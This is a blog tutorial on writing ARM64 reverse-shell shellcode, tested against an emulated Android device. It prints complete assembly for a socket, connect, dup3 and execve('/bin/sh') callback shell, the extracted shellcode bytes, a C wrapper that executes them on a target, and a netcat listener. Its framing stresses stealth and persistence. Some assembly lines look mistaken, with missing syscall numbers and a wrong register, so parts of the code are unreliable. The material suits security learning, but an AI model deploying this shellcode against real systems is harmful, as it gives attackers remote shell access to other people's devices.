---
description: 04/25/2024
cover: >-
  https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/be599129-f70d-4023-85f7-da62d2619de9/ddtz9di-15e0c135-1e51-446f-b5cb-69f20422864f.jpg/v1/fill/w_1110,h_386,q_75,strp/two_magic_conch_shells_by_delightfuldiamond7_ddtz9di-fullview.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9Mzg2IiwicGF0aCI6IlwvZlwvYmU1OTkxMjktZjcwZC00MDIzLTg1ZjctZGE2MmQyNjE5ZGU5XC9kZHR6OWRpLTE1ZTBjMTM1LTFlNTEtNDQ2Zi1iNWNiLTY5ZjIwNDIyODY0Zi5qcGciLCJ3aWR0aCI6Ijw9MTExMCJ9XV0sImF1ZCI6WyJ1cm46c2VydmljZTppbWFnZS5vcGVyYXRpb25zIl19.fBu5I18TeM2D2EtW9UEhEjGlA8Li3obgd7bEq0VZeRY
coverY: 39.96694214876033
---

# üêö ARM Shellcode

## Introduction

Be sure to check out my GitHub [repo](https://github.com/0xXyc/ARM-Reverse-Shell) that pertains to this writeup!

As we remember, shellcode is a set of instructions that is introduced usually as a payload for a program and will be executed as a strategic instruction set that will carry out the attacker's motives.

In this blog, we will be learning about ARM64 Assembly and writing shellcode for that specific architecture. Since we are writing shellcode that usually comes with environmental constraints attached to our target, it is recommended to learn how to operate your Assembly in THUMB-mode, which is what we will also be introducing here!

### Our Target :dart:

The target I will be attacking here will be an Android Studio emulated device. :space\_invader:

{% hint style="info" %}
By the way, this process is a whole lot more natural and streamlined if you have an Apple silicon (ARM) Mac. But, don't worry!!! If you don't, you can rely on <mark style="color:yellow;">**QEMU**</mark> and other cross-compilers to do the same exact thing that I'm doing in this!&#x20;

Point is, if you're on Apple Silicon or another ARM device, you can just run `as` or `ld` when compiling/linking because you're already on the native architecture.

(e.g.) just replace `as` (assembler) or `ld` (linker) with `aarch64-linux-gnu-as` or `aarch64-linux-gnu-ld`.&#x20;

However, when we start using <mark style="color:yellow;">THUMB</mark> mode and introduce the 16-bit instruction set, we will need to rely on `arm-linux-gnueabi-as`, etc., but that is for another time.

I just want to make you all aware!!!
{% endhint %}

Be sure to <mark style="color:yellow;">reference the ARM64 call table</mark> for syscall ID references and documentation.

{% embed url="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#arm64-64_bit" %}
Linux syscall table
{% endembed %}

## References

Seriously, take the time to check these out. No more than 5-10 mins of reading.&#x20;

{% embed url="https://systemweakness.com/in-the-mind-of-a-hacker-arm-reverse-shell-tcp-f169f2b791e6" %}
:bulb:
{% endembed %}

{% embed url="https://medium.com/syscall59/shellcode-for-iot-a-password-protected-reverse-shell-linux-arm-a18fcda4853b" %}
So insightful...
{% endembed %}

## Reverse Shells with Shellcode

Pay special attention to <mark style="color:green;">198</mark>, which is a socket syscall.&#x20;

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption><p>Last meme I promise... maybe</p></figcaption></figure>

### Things to Keep in Mind

One special trick that I found out rather quickly while playing with ARM ASM is that we have lots of control of the size and amount of instructions that we can introduce to the system/program due to branching and modes.&#x20;

Often times when working on exploits and creating shellcode, the goal is to make it as stealthy and as small as possible so we can fit it within small buffer sizes. We can leverage one of ARM's many capabilities and go into [Thumb mode](https://hacking.swizsecurity.com/hacking_methodology/programming/assembly/arm-aarch-64#arm-assembly).&#x20;

This essentially will:

* :thumbsdown: Trade off means we have fewer instructions and registries available&#x20;
* :thumbsup: Advantage is we are halving our instruction size from 32-bit (ARM-mode) to 16-bit (THUMB-mode)

This is very simple to accomplish. It takes place at the start of the program and will force our instructions and CPU to use THUMB-mode. This is done by branching our program\_counter+1 (`pc+1`).

This is our program counter register, the equivalent to the Instruction Pointer in x86\_64, this is a special-purpose register that holds the address of the next instruction to be executed by the CPU.

Building out your socket connection in ASM might seem a little daunting at first, but I'm here to tell you that you don't have to worry at all, I'm going to break this down for you as much as possible.&#x20;

{% hint style="info" %}
However, we're going to be focused on simplicity and staying in ARM mode for the first tutorial and then we'll gradually up the complexity with introducing THUMB mode as this is a bit of a learning curve for me as well.
{% endhint %}

### Socket Structure

1. Create a <mark style="color:yellow;">socket</mark> -> `mov w8,`` `<mark style="color:green;">`#198`</mark>
2. <mark style="color:yellow;">Connect</mark> to the <mark style="color:yellow;">socket</mark> -> `mov w8,`` `<mark style="color:green;">`#203`</mark> -- This will reference your <mark style="color:yellow;">struct</mark> that will hold important networking information such as the callback address&#x20;
3. duplicate3 (<mark style="color:yellow;">`dup3`</mark>) -- This will be split into three sections and is used for <mark style="color:yellow;">stdin</mark> (0), <mark style="color:yellow;">stdout</mark> (1), and <mark style="color:yellow;">stderr</mark> (2) for our socket's file descriptor (`sockfd`)
   1. You will be creating three of these sections using `dup3` in your code
   2. `dup3` utilizes syscall ID 24 -> `mov w8,`` `<mark style="color:green;">`#24`</mark>
4. Call <mark style="color:yellow;">`execve("/bin/sh")`</mark> -- This will execute the string `"/bin/sh"` and grant us a usable shell that our socket can access remotely -> `mov 28,`` `<mark style="color:green;">`#221`</mark>
5. <mark style="color:yellow;">Create</mark> your <mark style="color:yellow;">struct</mark>, this will hold your IP type (IPv4, IPv6, likely going to use AF\_INET), port number, and your IP address for the system to establish a remote connection back to
6. Specify your "<mark style="color:yellow;">/bin/sh</mark>" as a variable to keep things easily readable

{% hint style="info" %}
Keep on reading to see this in action and what all gets added into our PoC!
{% endhint %}

`reverseshell.s`:

```nasm
.section .text
.global _start
_start:

// socket(2, 1, 0) 
            mov   x0, #2
            mov   x1, #1
            mov   x2, #0
            mov   w8, #198
            svc   #1              // x0 = resultant sockfd 
            mov   x4, x0          // save sockfd in x4 

// connect(r0, &sockaddr, 16) 
        mov   x0, x4            // write 0 for AF_INET 
        adr   x1, sockaddr        // pointer to address, port 
        mov   x2, #16
        mov   w8, #203         // x8 = 203 (connect)
        svc   #1

// dup3(sockfd, 0, 0) 
          
        mov   x0, x4           // x4 is the saved sockfd 
        mov   x1, #0           // x1 = 0 (stdin)
        mov   x2, #0           // x2 = 0
        mov   w8, #24          
        svc   #1

// dup3(sockfd, 1, 0) 
        mov   x0, x4          // x4 is the saved sockfd 
        mov   x1, #1          // x1 = 1 (stdout) 
        mov   x0, #0          // x2 = 0 
        svc   #1

// dup3(sockfd, 2, 0) 
        mov   x0, x4         // x4 is the saved sockfd 
        mov   x1, #2         // x1 = 2 (stderr)
        mov   x2, #0         // x2 =
        svc   #1

// execve("/bin/sh",0,0) 
        adr   x0, shell
        mov   x1, #0        
        mov   x2, #0
        mov   w8, #221       // x8 = 221 (execve) 
        svc   #1

sockaddr:
    .ascii "\x02\x00"      // AF_INET
    .ascii "\x05\x39"      // port number 1337 
    .byte 0,0,0,0  // IP Address 
shell:
    .ascii "/bin/sh"
```

{% hint style="info" %}
I also recently learned that if you're really trying to save space but you're trying to land a shell in your shellcode, you can even get rid of `stderr` (`r0=3`) and your program will work fine without it. :bulb:
{% endhint %}

## We have our code, now what?

Now that we have our ASM source code, there are a two main things that we can do with it. We can convert this ASM into an executable binary, "carve" out the shell code (malicious instructions) that will be added to a benign/wrapper C program later.

These next few steps will ARM you (pun intended) with everything you need to accomplish both things listed above.&#x20;

### Creating an Executable

{% hint style="info" %}
_When running through this, make sure that you read the first note at the beginning of this blog right after the introduction or this may be rage-inducing lol._&#x20;
{% endhint %}

After you have your newly created reverse shell source code, you want to follow the ASM language lifecycle for a binary and assemble and link.

#### If you're on an <mark style="color:yellow;">ARM</mark>-native device:

```
as reverseshell.s -o reverseshell.o
ld reverseshell.o -o reverseshell
```

#### If you're on <mark style="color:yellow;">Intel</mark> (cross-compile)

```
aarch64-linux-gnu-as reverseshell.s -o reverseshell.o
aarch64-linux-gnu-ld reverseshell.o -o reverseshell
```

:star:Congrats!! You now have an executable that you can place on an exploited device and execute it to trigger a call back to your remote device.

### Carving out shellcode

Now, this could be a bit confusing at first, why would we want to do this?

Well, we would want to do this because after locating a vulnerability on our own, we may have a variety of constraints and other obstacles that we have to get around in order to gain access, establish persistence, or carry out other goals once we exploit that vulnerability.&#x20;

**This could include:**

* Small buffer space to work with
* Bad characters (e.g. null byte (0x00)
* Stealth -> drastically smaller file size when writing to disk (reduces chances of getting caught) :ninja:

```
objcopy -O binary reverseshell reverseshell.bin

aarch64-linux-gnu-objcopy // If cross-compiling
```

**Once you have created your binary object holding your binary's data, you can now "carve" it out:**

```
hexdump -v -e '"\\""x" 1/1 "%02x" ""' reverseshell.bin > my-first-shellcode.txt
```

Now, if we were to cat out that data within the `.txt` file, we will see only our shellcode!!!

As I said earlier, we can utilize this shellcode within a wrapper program that we can execute on our targets!

**What's in the .bin file? This will hold a copy of our object file. This is what the contents look like:**

```
cat reverseshell.bin

@ÔøΩÔøΩ!ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩR!ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩhÔøΩR!ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩR!ÔøΩÔøΩÔøΩ!ÔøΩÔøΩÔøΩÔøΩ!ÔøΩÔøΩÔøΩAÔøΩÔøΩÔøΩÔøΩ!ÔøΩÔøΩÔøΩÔøΩÔøΩ“®R!ÔøΩ9

/bin/sh% 
```

`my-first-shellcode.txt`(actual shellcode):

{% code overflow="wrap" %}
```
\x40\x00\x80\xd2\x21\x00\x80\xd2\x02\x00\x80\xd2\xc8\x18\x80\x52\x21\x00\x00\xd4\xe4\x03\x00\xaa\xe0\x03\x04\xaa\xc1\x02\x00\x10\x02\x02\x80\xd2\x68\x19\x80\x52\x21\x00\x00\xd4\xe0\x03\x04\xaa\x01\x00\x80\xd2\x02\x00\x80\xd2\x08\x03\x80\x52\x21\x00\x00\xd4\xe0\x03\x04\xaa\x21\x00\x80\xd2\x00\x00\x80\xd2\x21\x00\x00\xd4\xe0\x03\x04\xaa\x41\x00\x80\xd2\x02\x00\x80\xd2\x21\x00\x00\xd4\xe0\x00\x00\x10\x01\x00\x80\xd2\x02\x00\x80\xd2\xa8\x1b\x80\x52\x21\x00\x00\xd4\x02\x00\x05\x39\x0a\x0b\x03\x03\x2f\x62\x69\x6e\x2f\x73\x68%
```
{% endcode %}

:heart\_eyes: How awesome is that??

### Wrapper Program for Shellcode (in C)

**`shellcode-exec2.c`:**

```c
#include <stdio.h> 
#include <string.h>
/* This program will serve as a "wrapper" utility to both store and execute our shellcode on a target device */

typedef void (*execShellcode)();

void main() {

	unsigned char shellcode[] = 
	"\x40\x00\x80\xd2\x21\x00\x80\xd2"
	"\x02\x00\x80\xd2\xc8\x18\x80\x52"
	"\x21\x00\x00\xd4\xe4\x03\x00\xaa"
	"\xe0\x03\x04\xaa\xc1\x02\x00\x10"
	"\x02\x02\x80\xd2\x68\x19\x80\x52"
	"\x21\x00\x00\xd4\xe0\x03\x04\xaa"
	"\x01\x00\x80\xd2\x02\x00\x80\xd2"
	"\x08\x03\x80\x52\x21\x00\x00\xd4"
	"\xe0\x03\x04\xaa\x21\x00\x80\xd2"
	"\x00\x00\x80\xd2\x21\x00\x00\xd4"
	"\xe0\x03\x04\xaa\x41\x00\x80\xd2"
	"\x02\x00\x80\xd2\x21\x00\x00\xd4"
	"\xe0\x00\x00\x10\x01\x00\x80\xd2"
	"\x02\x00\x80\xd2\xa8\x1b\x80\x52"
	"\x21\x00\x00\xd4\x02\x00\x05\x39"
	"\x0a\x0b\x03\x03\x2f\x62\x69\x6e"
	"\x2f\x73\x68";

	printf("Shellcode length: %zu\n", sizeof(shellcode));
	
	// Shellcode to fp
	execShellcode func = (execShellcode)shellcode;

	// Execute shellcode
	printf("Executing shellcode...\n");
	func();

}
```

### Compile

```
gcc -g shellcode-exec2.c -o shellcode-exec2 -z execstack -fno-stack-protector
```

> :bulb:Yes, the stack must be set to executable here because we are working directly with shellcode.

### Netcat and Catch Connection

```
nc -lnvp 1337

./shellcode-exec2

Listening on 0.0.0.0 1337
Connection received on 127.0.0.1 49428
```

<figure><img src="../../.gitbook/assets/image (201).png" alt=""><figcaption><p>PoC</p></figcaption></figure>
